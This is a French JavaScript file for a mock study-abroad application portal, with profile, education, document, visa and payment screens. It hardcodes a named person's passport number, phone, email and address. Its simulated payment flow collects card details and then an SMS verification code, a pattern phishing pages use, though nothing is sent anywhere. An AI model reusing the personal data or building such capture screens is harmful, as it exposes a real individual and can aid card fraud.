// Variables globales
let isEditMode = false;
let currentSection = '';

// Fonctions pour la navigation
function toggleSidebar() {
  const sidebar = document.getElementById("sidebar");
  const overlay = document.getElementById("overlay");
  sidebar.classList.toggle("open");
  overlay.classList.toggle("active");
}

function showPage(pageId) {
  document.querySelectorAll('#main-content > div').forEach(page => {
    page.style.display = 'none';
  });
  document.getElementById(`${pageId}-page`).style.display = 'block';
  
  if (window.innerWidth < 768) {
    toggleSidebar();
  }
  
  if (pageId === 'profile') {
    showProfileSection('general');
  }
  
  if (pageId === 'notifications') {
    updateNotificationBadge();
  }
}

// Fonction pour télécharger le CV
function downloadCV() {
  const link = document.createElement('a');
  link.href = 'cv-oumaroudaoudasouleymane.pdf';
  link.download = 'cv-oumaroudaoudasouleymane.pdf';
  document.body.appendChild(link);
  link.click();
  document.body.removeChild(link);
  alert('Le téléchargement de votre CV a commencé.');
}

// Fonctions pour le mode édition
function toggleEditMode() {
  isEditMode = !isEditMode;
  const sectionContent = document.getElementById('profile-content');
  
  if (isEditMode) {
    sectionContent.classList.add('editable-section');
    activateEditMode();
    
    // Activer l'édition pour l'historique éducatif
    document.querySelectorAll('.education-item').forEach(item => {
      item.classList.add('editable');
    });
    
    // Ajouter le bouton "Ajouter une formation" si en mode édition
    const addButton = document.createElement('button');
    addButton.className = 'add-education-btn';
    addButton.innerHTML = '<i class="fas fa-plus"></i> Ajouter une formation';
    addButton.onclick = addNewEducation;
    
    const timeline = document.querySelector('.education-timeline');
    if (timeline && !document.querySelector('.add-education-btn')) {
      timeline.appendChild(addButton);
    }
  } else {
    sectionContent.classList.remove('editable-section');
    deactivateEditMode();
    
    // Désactiver l'édition pour l'historique éducatif
    document.querySelectorAll('.education-item').forEach(item => {
      item.classList.remove('editable');
    });
    
    // Supprimer le bouton "Ajouter une formation"
    const addButton = document.querySelector('.add-education-btn');
    if (addButton) {
      addButton.remove();
    }
  }
}

function activateEditMode() {
  const inputs = document.querySelectorAll(`#profile-content input:not([type=radio]):not([type=checkbox]), 
                                           #profile-content select, 
                                           #profile-content textarea`);
  const saveBtn = document.querySelector('#profile-content .save-btn');
  
  inputs.forEach(input => {
    input.classList.remove('disabled-field');
    input.readOnly = false;
    input.disabled = false;
  });
  
  saveBtn.classList.remove('btn-modify-disabled');
  saveBtn.classList.add('btn-modify-active');
  saveBtn.innerHTML = '<i class="fas fa-save"></i> Enregistrer';
}

function deactivateEditMode() {
  const inputs = document.querySelectorAll(`#profile-content input:not([type=radio]):not([type=checkbox]), 
                                           #profile-content select, 
                                           #profile-content textarea`);
  const saveBtn = document.querySelector('#profile-content .save-btn');
  
  inputs.forEach(input => {
    input.classList.add('disabled-field');
    input.readOnly = true;
  });
  
  saveBtn.classList.remove('btn-modify-active');
  saveBtn.classList.add('btn-modify-disabled');
  saveBtn.innerHTML = '<i class="fas fa-edit"></i> Modifier';
}

// Profil sections
const profileSections = {
  general: `
    <div class="profile-header">
      <h1>Informations Personnelles</h1>
      <p>Informations en lecture seule</p>
    </div>
    <div class="card">
      <div class="section-title">
        <i class="fas fa-user"></i>
        <h2>Informations Personnelles</h2>
      </div>
      <div class="grid">
        <div><label>Prénom *</label><input type="text" value="Souleymane" class="disabled-field" readonly /></div>
        <div><label>Nom *</label><input type="text" value="Oumarou Daouda" class="disabled-field" readonly /></div>
        <div><label>Date de naissance *</label><input type="date" value="1995-05-12" class="disabled-field" readonly /></div>
	<div><label>Lieux de Naissance *</label><input type="text" value="Niamey" class="disabled-field" readonly /></div>       
        <div><label>Langue maternelle *</label><input type="text" value="Français" class="disabled-field" readonly /></div>
        <div><label>Nationalité *</label><input type="text" value="Nigerienne" class="disabled-field" readonly /></div>
        <div><label>PassePort *</label><input type="text" value="13pc50948" class="disabled-field" readonly /></div>
        <div><label>PassePort Expire Date *</label><input type="date" value="2025-06-01" class="disabled-field" readonly /></div>
        <div><label>Statut Matrimonial *</label><input type="text" value="Celibataire" class="disabled-field" readonly /></div>
        <div><label>Telephone *</label><input type="tel" value="227 92111178" class="disabled-field" readonly /></div>
        <div><label>Adresse email *</label><input type="email" value="oumaroudaoudasouleymane@yahoo.com" class="disabled-field" readonly /></div>
        <div><label>Ville *</label><input type="text" value="Niamey" class="disabled-field" readonly /></div>
        <div><label>Adress *</label><input type="text" value="BOUKOKI 4" class="disabled-field" readonly /></div>
        <div><label>Code Postal *</label><input type="text" value="8002" class="disabled-field" readonly /></div>
        <div><label>Pays *</label><input type="text" value="NIGER" class="disabled-field" readonly /></div>
      </div>
      <div class="clearfix">
        <button class="save-btn btn-modify-disabled">
          <i class="fas fa-edit"></i> Modifier
        </button>
      </div>
      <p class="not-editable-message">Cliquez sur "Modifier" pour mettre à jour vos informations</p>
    </div>
  `,
  
education: `
  <div class="profile-header">
    <h1>Parcours Académique</h1>
    <p>Historique de vos formations et diplômes</p>
  </div>
  
  <div class="card">
    <div class="section-title">
      <i class="fas fa-graduation-cap"></i>
      <h2>Historique Éducatif</h2>
    </div>
    
    <div class="education-timeline">
      <!-- Diplôme de Licence -->
      <div class="education-item" onclick="toggleEducationDetails('bachelor')">
        <div class="education-header">
          <i class="fas fa-circle icon-red"></i>
          <div class="education-title">1-YEAR MASTER DEGREE</div>
          <i class="fas fa-chevron-down toggle-icon" id="toggle-bachelor"></i>
        </div>
        <div class="education-details" id="details-bachelor" style="display: none;">
          <div class="detail-row">
            <label>Établissement:</label>
            <span>IPHEC</span>
          </div>
          <div class="detail-row">
            <label>Adresse:</label>
            <span>Any Koira, 2288 Niamey</span>
          </div>
          <div class="detail-row">
            <label>Période:</label>
            <span>Septembre 2019 - Juin 2020</span>
          </div>
          <div class="detail-row">
            <label>Moyenne:</label>
            <span>11.98/20</span>
          </div>
          <div class="detail-row">
            <label>Spécialisation:</label>
            <span>LOGISTIQUE-TRANSPORT</span>
          </div>
          <div class="detail-row">
            <label>Diplôme obtenu:</label>
            <span>Oui</span>
          </div>
        </div>
      </div>

       <div class="education-item" onclick="toggleEducationDetails('bachelor')">
        <div class="education-header">
          <i class="fas fa-circle icon-red"></i>
          <div class="education-title">1-YEAR LICENCE</div>
          <i class="fas fa-chevron-down toggle-icon" id="toggle-bachelor"></i>
        </div>
        <div class="education-details" id="details-bachelor" style="display: none;">
          <div class="detail-row">
            <label>Établissement:</label>
            <span>ESCOM</span>
          </div>
          <div class="detail-row">
            <label>Adresse:</label>
            <span>QT Abidjan, 2437 Niamey</span>
          </div>
          <div class="detail-row">
            <label>Période:</label>
            <span>Septembre 2018 - Juin 2019</span>
          </div>
          <div class="detail-row">
            <label>Moyenne:</label>
            <span>12.87/20</span>
          </div>
          <div class="detail-row">
            <label>Spécialisation:</label>
            <span>MANAGEMENT LOGISTIQUE-TRANSPORT</span>
          </div>
          <div class="detail-row">
            <label>Diplôme obtenu:</label>
            <span>Oui</span>
          </div>
        </div>
      </div>

         <div class="education-item" onclick="toggleEducationDetails('bachelor')">
        <div class="education-header">
          <i class="fas fa-circle icon-red"></i>
          <div class="education-title">2-YEAR LICENCE</div>
          <i class="fas fa-chevron-down toggle-icon" id="toggle-bachelor"></i>
        </div>
        <div class="education-details" id="details-bachelor" style="display: none;">
          <div class="detail-row">
            <label>Établissement:</label>
            <span>ECCAM</span>
          </div>
          <div class="detail-row">
            <label>Adresse:</label>
            <span>BOUKOKI 2, Niamey</span>
          </div>
          <div class="detail-row">
            <label>Période:</label>
            <span>Septembre 2018 - Juin 2019</span>
          </div>
          <div class="detail-row">
            <label>Moyenne:</label>
            <span>12/20</span>
          </div>
          <div class="detail-row">
            <label>Spécialisation:</label>
            <span>TRANSPORT-LOGISTIQUE</span>
          </div>
          <div class="detail-row">
            <label>Diplôme obtenu:</label>
            <span>BTS - 2018</span>
          </div>
        </div>
      </div>
      
      <!-- Lycée -->
      <div class="education-item" onclick="toggleEducationDetails('highschool')">
        <div class="education-header">
          <i class="fas fa-circle icon-red"></i>
          <div class="education-title">GRADE 12 / HIGH SCHOOL</div>
          <i class="fas fa-chevron-down toggle-icon" id="toggle-highschool"></i>
        </div>
        <div class="education-details" id="details-highschool" style="display: none;">
          <div class="detail-row">
            <label>Établissement:</label>
            <span>Lycée SONI ALI BER</span>
          </div>
          <div class="detail-row">
            <label>Adresse:</label>
            <span>COMPLEXE, 28501 Niamey</span>
          </div>
          <div class="detail-row">
            <label>Période:</label>
            <span>Septembre 2013 - Juillet 2016</span>
          </div>
          <div class="detail-row">
            <label>Moyenne au bac:</label>
            <span>14.22/20</span>
          </div>
          <div class="detail-row">
            <label>Filière:</label>
            <span>Scientifique</span>
          </div>
          <div class="detail-row">
            <label>Mention:</label>
            <span>Bien</span>
          </div>
        </div>
      </div>
    </div>
    
    <div class="clearfix">
      <button class="save-btn btn-modify-disabled">
        <i class="fas fa-edit"></i> Modifier
      </button>
    </div>
    <p class="not-editable-message">Cliquez sur "Modifier" pour mettre à jour votre parcours</p>
  </div>
`,
  
documents: `
  <div class="profile-header">
    <h1>Documents</h1>
    <p>Gérez vos documents requis</p>
  </div>
  <div class="card">
    <div class="section-title">
      <i class="fas fa-file-alt"></i>
      <h2>Documents Requis</h2>
    </div>
    
    <div class="document-list">
      <div class="document-item">
        <div class="document-info">
          <input type="checkbox" id="passport" disabled checked>
          <label for="passport">Passeport valide</label>
        </div>
        <div class="document-status">
          <span class="status-uploaded">
            <i class="fas fa-check-circle"></i> Téléchargé
          </span>
          <button class="app-btn btn-download" onclick="downloadDocument('passport')">
            <i class="fas fa-download"></i> Télécharger
          </button>
        </div>
      </div>
      <div class="document-item">
        <div class="document-info">
          <input type="checkbox" id="financial" checked>
          <label for="financial">Preuves financières</label>
        </div>
        <div class="document-status">
          <span class="status-uploaded">
            <i class="fas fa-clock"></i> En attente
          </span>
          <button class="app-btn btn-download" onclick="downloadDocument('finance')">
            <i class="fas fa-download"></i> Télécharger
          </button>
        </div>
      </div>

            <div class="document-item">
        <div class="document-info">
          <input type="checkbox" id="BAC" checked>
          <label for="financial">BAC Transcript</label>
        </div>
        <div class="document-status">
          <span class="status-uploaded">
            <i class="fas fa-clock"></i> En attente
          </span>
          <button class="app-btn btn-download" onclick="downloadDocument('bac')">
            <i class="fas fa-download"></i> Télécharger
          </button>
        </div>
      </div>
      
      <div class="document-item">
        <div class="document-info">
          <input type="checkbox" id="licence_2" disabled>
          <label for="licence_2">Transcript ECCAM</label>
        </div>
        <div class="document-status">
          <span class="status-pending">
            <i class="fas fa-clock"></i> En attente
          </span>
          <button class="app-btn btn-upload" onclick="uploadDocument('licence_2')">
            <i class="fas fa-upload"></i> Téléverser
          </button>
        </div>
      </div>
      
      <div class="document-item">
        <div class="document-info">
          <input type="checkbox" id="licence_3" disabled>
          <label for="licence_3">Transcript ESCOM</label>
        </div>
        <div class="document-status">
          <span class="status-pending">
            <i class="fas fa-clock"></i> En attente
          </span>
          <button class="app-btn btn-upload" onclick="uploadDocument('licence_3')">
            <i class="fas fa-upload"></i> Téléverser
          </button>
        </div>
      </div>

	<div class="document-item">
        <div class="document-info">
          <input type="checkbox" id="licence_3" disabled>
          <label for="licence_3">Transcript IPHEC</label>
        </div>
        <div class="document-status">
          <span class="status-pending">
            <i class="fas fa-clock"></i> En attente
          </span>
          <button class="app-btn btn-upload" onclick="uploadDocument('Master_1')">
            <i class="fas fa-upload"></i> Téléverser
          </button>
        </div>
      </div>
      
      
      <div class="document-item">
        <div class="document-info">
          <input type="checkbox" id="photos" disabled checked>
          <label for="photos">Photos d'identité</label>
        </div>
        <div class="document-status">
          <span class="status-uploaded">
            <i class="fas fa-check-circle"></i> Téléchargé
          </span>
          <button class="app-btn btn-download" onclick="downloadDocument('photos')">
            <i class="fas fa-download"></i> Télécharger
          </button>
        </div>
      </div>
    </div>
    
    <button class="upload-btn" onclick="showUploadModal()">
      <i class="fas fa-plus"></i> Ajouter des documents
    </button>
  </div>
`,
  
  visa: `
    <div class="profile-header">
      <h1>Visa & Permis d'Études</h1>
      <p>Informations sur votre statut d'immigration</p>
    </div>
    <div class="card">
      <div class="section-title">
        <i class="fas fa-passport"></i>
        <h2>Visa & Permis d'Études</h2>
      </div>
      <div id="visaPermit">
        <div style="margin-top: 1.5rem;">
          <label style="font-weight: bold; display: block; margin-bottom: 0.5rem;">
            Avez-vous déjà été refusé un visa pour le Canada, les États-Unis, le Royaume-Uni, la Nouvelle-Zélande, l'Australie ou l'Irlande ? *
          </label>
          <div class="radio-group" style="gap: 2rem;">
            <label><input type="radio" name="refusedVisa" /> Oui</label>
            <label><input type="radio" name="refusedVisa" checked /> Non</label>
          </div>
        </div>
        <div style="margin-top: 2rem;">
          <label style="font-weight: bold;">Quels permis d'études ou visas valides possédez-vous ?</label>
          <div class="radio-group" style="margin-top: 0.5rem; flex-wrap: wrap; gap: 1rem;">
            <label style="display: flex; align-items: center; gap: 0.5rem;">
              <input type="checkbox" /> Canada
            </label>
            <label style="display: flex; align-items: center; gap: 0.5rem;">
              <input type="checkbox" /> États-Unis
            </label>
            <label style="display: flex; align-items: center; gap: 0.5rem;">
              <input type="checkbox" /> Royaume-Uni
            </label>
            <label style="display: flex; align-items: center; gap: 0.5rem;">
              <input type="checkbox" /> Australie
            </label>
            <label style="display: flex; align-items: center; gap: 0.5rem;">
              <input type="checkbox" checked /> Aucun
            </label>
          </div>
        </div>
        <div style="margin-top: 2rem;">
          <label style="font-weight: bold;">
            Veuillez fournir plus d'informations sur votre permis d'études/visa actuel et tout refus antérieur, le cas échéant
          </label>
          <textarea placeholder="Décrivez votre situation..." style="width: 100%; padding: 0.8rem; height: 100px; margin-top: 0.5rem; border: 1px solid #ccc; border-radius: 5px; font-size: 1rem;"></textarea>
        </div>
        <div class="clearfix">
          <button class="save-btn" style="background: #198754;">
            <i class="fas fa-save"></i> Enregistrer & Continuer
          </button>
        </div>
      </div>
    </div>
  `,
  
  tests: `
    <div class="profile-header">
      <h1>Résultats de Tests</h1>
      <p>Vos scores aux examens linguistiques</p>
    </div>
    <div class="card">
      <div class="section-title">
        <i class="fas fa-language"></i>
        <h2>Scores aux Tests d'Anglais</h2>
      </div>
      <div id="testEnglish">
        <div class="radio-group" style="flex-direction: column; align-items: flex-start; margin-top: 1rem; gap: 0.8rem;">
          <label><input type="radio" name="english" /> TOEFL</label>
          <label><input type="radio" name="english" /> IELTS</label>
          <label><input type="radio" name="english" /> PTE</label>
          <label><input type="radio" name="english" /> Duolingo</label>
          <label><input type="radio" name="english" /> Je n'ai pas de test</label>
          <label><input type="radio" name="english" checked /> Pas encore, mais je le ferai à l'avenir</label>
          <small>Si vous n'avez pas encore passé de test, AppliedBoard peut vous aider à le faire à l'avenir.</small>
        </div>
        <div class="clearfix"><button class="save-btn">Enregistrer & Continuer</button></div>
      </div>
    </div>
  `
};

function showProfileSection(section) {
  currentSection = section;
  document.getElementById('profile-content').innerHTML = profileSections[section];
  
  // Mettre à jour le menu actif
  const sections = ['general', 'education', 'documents', 'tests', 'visa'];
  sections.forEach(sec => {
    const menuItem = document.getElementById(`menu-${sec}`);
    if (menuItem) {
      menuItem.classList.remove('active');
      const icon = menuItem.querySelector('.menu-icon');
      if (icon) {
        icon.classList.remove('fa-check-circle');
        icon.classList.add('fa-arrow-circle-right');
      }
    }
  });
  
  document.getElementById(`menu-${section}`).classList.add('active');
  const activeIcon = document.querySelector(`#menu-${section} .menu-icon`);
  activeIcon.classList.remove('fa-arrow-circle-right');
  activeIcon.classList.add('fa-check-circle');
  
  // Ajouter l'événement au bouton Modifier
  const saveBtn = document.querySelector('#profile-content .save-btn');
  if (saveBtn) {
    saveBtn.onclick = toggleEditMode;
  }
}

function toggleSection(id) {
  const section = document.getElementById(id);
  const icon = document.getElementById('icon-' + id);
  if (section.style.display === "none" || section.style.display === "") {
    section.style.display = "block";
    icon.classList.remove('fa-chevron-down');
    icon.classList.add('fa-chevron-up');
  } else {
    section.style.display = "none";
    icon.classList.remove('fa-chevron-up');
    icon.classList.add('fa-chevron-down');
  }
}

function uploadDocuments() {
  alert("Fonctionnalité de téléchargement activée. Veuillez sélectionner les documents à télécharger.");
}

function handleCardClick(card) {
  card.style.boxShadow = '0 0 15px rgba(0, 123, 255, 0.6)';
  setTimeout(() => {
    card.style.boxShadow = '';
  }, 300);
}

// Fonctions pour les notifications
function markAsRead(button) {
  const card = button.closest('.notification-card');
  card.classList.remove('unread');
  
  // Mettre à jour le badge de notification
  updateNotificationBadge();
}

function deleteNotification(button) {
  const card = button.closest('.notification-card');
  card.style.opacity = '0';
  setTimeout(() => {
    card.remove();
    updateNotificationBadge();
  }, 300);
}

function updateNotificationBadge() {
  const unreadNotifications = document.querySelectorAll('.notification-card.unread').length;
  const badge = document.querySelector('.notification-badge');
  
  if (unreadNotifications > 0) {
    badge.textContent = unreadNotifications;
    badge.style.display = 'flex';
  } else {
    badge.style.display = 'none';
  }
}

// Données des programmes
const programData = {
  "International Business": {
    description: "Le programme International Business prépare les étudiants à travailler dans un environnement commercial mondial. Les cours couvrent les opérations commerciales internationales, le marketing mondial, la finance internationale et les stratégies de gestion interculturelle.",
    requirements: [
      "Diplôme d'études secondaires ou équivalent",
      "TOEFL iBT 61 ou IELTS 5.5 (pour les non-anglophones)",
      "Relevés de notes officiels",
      "Lettre de motivation",
      "2 lettres de recommandation"
    ],
    dates: [
      "Date limite d'inscription: 15/08/2025",
      "Début des cours: 25/08/2025",
      "Date limite de paiement: 20/08/2025"
    ],
    careers: [
      "Spécialiste du commerce international",
      "Analyste de marché global",
      "Coordinateur des importations/exportations",
      "Représentant des ventes internationales"
    ]
  },
  "Logistics and Global Supply Chain Management": {
    description: "Ce programme forme les étudiants à gérer les flux de marchandises à l'échelle mondiale. Les cours couvrent la gestion des transports, l'entreposage, la gestion des stocks, les douanes et la réglementation internationale.",
    requirements: [
      "Diplôme d'études secondaires ou équivalent",
      "TOEFL iBT 61 ou IELTS 5.5 (pour les non-anglophones)",
      "Relevés de notes officiels",
      "CV/Curriculum Vitae",
      "Preuve de fonds suffisants"
    ],
    dates: [
      "Date limite d'inscription: 01/09/2025",
      "Début des cours: 10/09/2025",
      "Date limite de paiement: 05/09/2025"
    ],
    careers: [
      "Gestionnaire de la chaîne d'approvisionnement",
      "Analyste logistique",
      "Coordinateur des transports",
      "Gestionnaire des opérations d'entrepôt"
    ]
  }
};

// Fonction pour afficher les détails du programme
function showProgramDetails(programName) {
  const program = programData[programName];
  
  // Mettre à jour le titre
  document.getElementById('program-details-title').textContent = programName;
  document.getElementById('program-details-college').textContent = "Houston Community College";
  
  // Remplir les sections
  document.getElementById('program-description').innerHTML = `<p>${program.description}</p>`;
  
  let requirementsHtml = '<ul>';
  program.requirements.forEach(req => {
    requirementsHtml += `<li>${req}</li>`;
  });
  requirementsHtml += '</ul>';
  document.getElementById('program-requirements').innerHTML = requirementsHtml;
  
  let datesHtml = '<ul>';
  program.dates.forEach(date => {
    datesHtml += `<li>${date}</li>`;
  });
  datesHtml += '</ul>';
  document.getElementById('program-dates').innerHTML = datesHtml;
  
  let careersHtml = '<ul>';
  program.careers.forEach(career => {
    careersHtml += `<li>${career}</li>`;
  });
  careersHtml += '</ul>';
  document.getElementById('program-careers').innerHTML = careersHtml;
  
  // Afficher la page des détails
  showPage('program-details');
}

// Initialisation
document.addEventListener('DOMContentLoaded', function() {
  showPage('home');
  updateNotificationBadge();
});

// Ajouter ces fonctions au fichier script.js

// Fonction pour afficher la page de paiement
function showPaymentPage(programName, amount) {
  // Créer le contenu HTML de la page de paiement
  const paymentHTML = `
    <div id="payment-page">
      <div class="payment-container">
        <h1>Paiement pour ${programName}</h1>
        <p class="payment-amount">Montant à payer: ${amount} €</p>
        
        <div class="payment-card">
          <h2><i class="fas fa-credit-card"></i> Informations de paiement</h2>
          
          <div class="payment-form">
            <div class="form-group">
              <label for="card-number">Numéro de carte *</label>
              <input type="text" id="card-number" placeholder="1234 5678 9012 3456" maxlength="19">
            </div>
            
            <div class="form-group">
              <label for="card-name">Nom sur la carte *</label>
              <input type="text" id="card-name" placeholder="Nom Prénom">
            </div>
            
            <div class="form-row">
              <div class="form-group">
                <label for="expiry-date">Date d'expiration *</label>
                <input type="text" id="expiry-date" placeholder="MM/AA" maxlength="5">
              </div>
              
              <div class="form-group">
                <label for="cvv">CVV *</label>
                <input type="text" id="cvv" placeholder="123" maxlength="3">
              </div>
            </div>
            
            <div class="payment-methods">
              <div class="payment-method active">
                <i class="fab fa-cc-visa"></i> Visa
              </div>
              <div class="payment-method">
                <i class="fab fa-cc-mastercard"></i> Mastercard
              </div>
              <div class="payment-method">
                <i class="fas fa-university"></i> Virement
              </div>
            </div>
            
            <button class="payment-btn" onclick="processPayment('${programName}', ${amount})">
              <i class="fas fa-lock"></i> Payer ${amount} €
            </button>
            
            <p class="payment-security">
              <i class="fas fa-lock"></i> Transactions sécurisées avec chiffrement SSL
            </p>
          </div>
        </div>
      </div>
    </div>
  `;

  // Créer un nouvel élément div pour la page de paiement
  const paymentPage = document.createElement('div');
  paymentPage.id = 'payment-page';
  paymentPage.innerHTML = paymentHTML;
  
  // Ajouter la page au contenu principal
  const mainContent = document.getElementById('main-content');
  mainContent.appendChild(paymentPage);
  
  // Masquer toutes les autres pages et afficher la page de paiement
  showPage('payment');
  
  // Ajouter les gestionnaires d'événements pour les méthodes de paiement
  document.querySelectorAll('.payment-method').forEach(method => {
    method.addEventListener('click', function() {
      document.querySelectorAll('.payment-method').forEach(m => m.classList.remove('active'));
      this.classList.add('active');
    });
  });
  
  // Formater automatiquement le numéro de carte
  document.getElementById('card-number').addEventListener('input', function(e) {
    let value = e.target.value.replace(/\s+/g, '');
    if (value.length > 0) {
      value = value.match(new RegExp('.{1,4}', 'g')).join(' ');
    }
    e.target.value = value;
  });
  
  // Formater automatiquement la date d'expiration
  document.getElementById('expiry-date').addEventListener('input', function(e) {
    let value = e.target.value.replace(/\D+/g, '');
    if (value.length > 2) {
      value = value.substring(0, 2) + '/' + value.substring(2, 4);
    }
    e.target.value = value;
  });
}

// Fonction pour traiter le paiement
function processPayment(programName, amount) {
  const cardNumber = document.getElementById('card-number').value;
  const cardName = document.getElementById('card-name').value;
  const expiryDate = document.getElementById('expiry-date').value;
  const cvv = document.getElementById('cvv').value;
  
  // Validation simple
  if (!cardNumber || !cardName || !expiryDate || !cvv) {
    alert('Veuillez remplir tous les champs obligatoires');
    return;
  }
  
  if (cardNumber.replace(/\s/g, '').length !== 16) {
    alert('Veuillez entrer un numéro de carte valide (16 chiffres)');
    return;
  }
  
  if (cvv.length !== 3) {
    alert('Veuillez entrer un code CVV valide (3 chiffres)');
    return;
  }
  
  // Simuler un traitement de paiement
  setTimeout(() => {
    showPaymentSuccess(programName, amount);
  }, 1500);
}

// Fonction pour afficher la confirmation de paiement
function showPaymentSuccess(programName, amount) {
  document.getElementById('payment-page').innerHTML = `
    <div class="payment-container">
      <div class="payment-success">
        <i class="fas fa-check-circle"></i>
        <h2>Paiement confirmé !</h2>
        <p>Votre paiement de ${amount} € pour le programme ${programName} a été traité avec succès.</p>
        <p>Une confirmation a été envoyée à votre adresse email.</p>
        <div class="payment-details">
          <p><strong>Référence:</strong> PAY-${Math.floor(100000 + Math.random() * 900000)}</p>
          <p><strong>Date:</strong> ${new Date().toLocaleDateString()}</p>
        </div>
        <button class="payment-btn" onclick="showPage('payments')">
          <i class="fas fa-arrow-left"></i> Retour aux paiements
        </button>
      </div>
    </div>
  `;
}

// Mettre à jour la fonction showPage pour inclure la page de paiement
function showPage(pageId) {
  document.querySelectorAll('#main-content > div').forEach(page => {
    page.style.display = 'none';
  });
  
  if (pageId === 'payment') {
    document.getElementById('payment-page').style.display = 'block';
  } else {
    document.getElementById(`${pageId}-page`).style.display = 'block';
  }
  
  if (window.innerWidth < 768) {
    toggleSidebar();
  }
  
  if (pageId === 'profile') {
    showProfileSection('general');
  }
  
  if (pageId === 'notifications') {
    updateNotificationBadge();
  }
}

// Ajoutez ces fonctions à votre fichier script.js

function processPayment(programName, amount) {
  const cardNumber = document.getElementById('card-number').value;
  const cardName = document.getElementById('card-name').value;
  const expiryDate = document.getElementById('expiry-date').value;
  const cvv = document.getElementById('cvv').value;
  
  // Validation
  if (!cardNumber || !cardName || !expiryDate || !cvv) {
    alert('Veuillez remplir tous les champs obligatoires');
    return;
  }
  
  // Afficher le loading
  showPaymentLoading(programName, amount);
  
  // Simuler l'envoi des données et la réception du code
  setTimeout(() => {
    showVerificationForm(programName, amount);
  }, 4000);
}

function showPaymentLoading(programName, amount) {
  document.getElementById('payment-page').innerHTML = `
    <div class="payment-container">
      <div class="payment-loading">
        <i class="fas fa-spinner"></i>
        <h2>Traitement de votre paiement</h2>
        <p>Veuillez patienter pendant que nous traitons votre paiement de ${amount} € pour ${programName}...</p>
      </div>
    </div>
  `;
}

function showVerificationForm(programName, amount) {
  document.getElementById('payment-page').innerHTML = `
    <div class="payment-container">
      <div class="verification-card">
        <h2><i class="fas fa-mobile-alt"></i> Vérification en 2 étapes</h2>
        <p>Nous avons envoyé un code de vérification à votre numéro de téléphone enregistré.</p>
        
        <div class="verification-inputs">
          <input type="text" maxlength="1" oninput="moveToNext(this, 1)">
          <input type="text" maxlength="1" oninput="moveToNext(this, 2)">
          <input type="text" maxlength="1" oninput="moveToNext(this, 3)">
          <input type="text" maxlength="1" oninput="moveToNext(this, 4)">
          <input type="text" maxlength="1" oninput="moveToNext(this, 5)">
          <input type="text" maxlength="1" oninput="verifyCode(this)">
        </div>
        
        <p class="verification-note">
          Entrez le code à 6 chiffres reçu par SMS
        </p>
        
        <button class="payment-btn" onclick="completePayment('${programName}', ${amount})">
          <i class="fas fa-check-circle"></i> Valider
        </button>
        
        <p style="margin-top: 1rem;">
          Vous n'avez pas reçu de code ? <span class="resend-code" onclick="resendCode()">Renvoyer le code</span>
        </p>
      </div>
    </div>
  `;
}

function moveToNext(input, nextIndex) {
  if (input.value.length === 1) {
    const nextInput = input.parentElement.querySelector(`input:nth-child(${nextIndex + 1})`);
    if (nextInput) {
      nextInput.focus();
    }
  }
}

function verifyCode(input) {
  if (input.value.length === 1) {
    // Vous pouvez ajouter ici la logique pour vérifier immédiatement le code
    // au lieu d'attendre le clic sur le bouton Valider
  }
}

function resendCode() {
  alert("Un nouveau code a été envoyé à votre numéro de téléphone.");
  // Ici vous pourriez implémenter la logique pour renvoyer réellement le code
}

function completePayment(programName, amount) {
  const codeInputs = document.querySelectorAll('.verification-inputs input');
  let verificationCode = '';
  
  codeInputs.forEach(input => {
    verificationCode += input.value;
  });
  
  if (verificationCode.length !== 6) {
    alert('Veuillez entrer un code de vérification complet (6 chiffres)');
    return;
  }
  
  // Simuler la vérification du code
  showPaymentSuccess(programName, amount);
}

// Fonction pour afficher/masquer les détails de l'éducation
function toggleEducationDetails(id) {
  const details = document.getElementById(`details-${id}`);
  const icon = document.getElementById(`toggle-${id}`);
  
  if (details.style.display === "none" || details.style.display === "") {
    details.style.display = "block";
    icon.classList.remove('fa-chevron-down');
    icon.classList.add('fa-chevron-up');
  } else {
    details.style.display = "none";
    icon.classList.remove('fa-chevron-up');
    icon.classList.add('fa-chevron-down');
  }
}
function downloadDocument(type) {
  alert('Téléchargement du ' + type + ' en cours...');
  // Implémentez la logique réelle ici
}

function uploadDocument(type) {
  alert('Téléversement du ' + type + ' en cours...');
  // Implémentez la logique réelle ici
}

function showUploadModal() {
  alert('Ouverture de la fenêtre pour ajouter des documents');
  // Implémentez la modal réelle ici
}
